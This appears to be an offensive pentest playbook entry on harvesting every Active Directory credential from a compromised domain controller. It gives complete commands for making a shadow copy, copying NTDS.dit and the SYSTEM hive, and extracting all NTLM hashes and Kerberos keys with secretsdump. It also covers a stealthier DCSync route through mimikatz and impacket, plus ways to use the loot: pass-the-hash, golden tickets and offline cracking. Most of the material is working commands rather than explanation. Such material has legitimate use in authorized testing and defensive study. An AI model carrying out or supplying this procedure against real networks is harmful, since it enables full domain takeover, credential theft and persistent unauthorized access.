title: Shadow Copy + NTDS Extraction — Dump Every Domain Hash Offline
body:
Once you're domain admin on the DC, the whole domain's credentials live in one file: C:\Windows\NTDS\NTDS.dit (the AD database). It's locked while AD runs, so you can't just copy it. Volume Shadow Copy (VSS) takes a snapshot of the volume, and you copy NTDS.dit out of the snapshot — then extract every user's NTLM hash and Kerberos key offline on Kali with secretsdump.

WHAT YOU GET:
  NTLM hashes + Kerberos keys for EVERY domain account — all users, all computer accounts, krbtgt. This is the full domain. From here you can pass-the-hash as anyone, crack offline, or forge golden tickets with krbtgt's hash.

PREREQUISITE: domain admin on the DC. Like golden ticket, this is post-domain-compromise — it's how you HARVEST everything after popping the DC, not an entry vector.

THREE INGREDIENTS for offline extraction:
  1. NTDS.dit (from the shadow copy) — the database
  2. The SYSTEM registry hive — holds the boot key that decrypts it
  3. secretsdump with the LOCAL keyword to parse them on Kali

ALTERNATIVE — DCSync is quieter:
  Shadow copy writes files and leaves a trail. DCSync (lsadump::dcsync) pulls hashes over the replication protocol with no file drop and no DC login needed (just DA-equivalent rights). Prefer DCSync on engagements where stealth matters; shadow copy is the 'I'm already on the DC with a shell' approach.

The krbtgt hash from this dump is exactly what feeds a golden ticket — chain them for persistence.
cmd:
# ══════════════════════════════════════════════════
# ON THE DC (as a domain admin, elevated cmd) — create a shadow copy
# ══════════════════════════════════════════════════
C:\Tools> vshadow.exe -nw -p C:
#   -nw  no writers (faster)   -p  persist on disk
# Note the 'Shadow copy device name', e.g.:
#   \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2

# Copy NTDS.dit out of the snapshot:
C:\Tools> copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2\windows\ntds\ntds.dit c:\ntds.dit.bak

# Save the SYSTEM hive (holds the boot key to decrypt NTDS):
C:\> reg.exe save hklm\system c:\system.bak

# ══════════════════════════════════════════════════
# EXFIL both .bak files to Kali, then extract offline
# ══════════════════════════════════════════════════
impacket-secretsdump -ntds ntds.dit.bak -system system.bak LOCAL
#   dumps domain\uid:rid:lmhash:nthash for EVERY account, plus Kerberos keys
#   Administrator:500:...:2892d26cdf84d7a70e2eb3b9f05c425e:::
#   krbtgt:502:...:1693c6cefafffc7af11ef34d1c788f47:::   <- feeds a golden ticket
#   (every user + COMPUTER$ account + krbtgt)

# ══════════════════════════════════════════════════
# QUIETER ALTERNATIVE — DCSync (no files, no DC login)
# ══════════════════════════════════════════════════
# From any DA-equivalent box:
mimikatz # lsadump::dcsync /domain:corp.com /all
# or just one account:
mimikatz # lsadump::dcsync /user:krbtgt
# impacket:
impacket-secretsdump corp.com/da_user@dc1.corp.com -just-dc
#   -just-dc      all domain hashes via replication
#   -just-dc-user krbtgt   just one

# ══════════════════════════════════════════════════
# WHAT TO DO WITH THE LOOT
# ══════════════════════════════════════════════════
# - Pass-the-hash as Administrator (RID 500) anywhere
# - Forge a golden ticket with krbtgt's hash (persistence)
# - Crack offline with hashcat -m 1000 for cleartext (reuse on web logins etc.)
# - Computer account hashes ($) for resource-based delegation / silver tickets
warn: Requires domain admin on the DC — this is post-compromise credential harvesting, not an entry vector. The shadow-copy method writes files (ntds.dit.bak, system.bak) and leaves a trail; DCSync is the quieter alternative. The resulting dump contains EVERY domain credential including krbtgt — handle and store it like the crown jewels, and clean up the .bak files and shadow copy afterward.

choices.label: Quieter — pull hashes via DCSync instead
Got krbtgt's hash — forge a golden ticket (persistence)
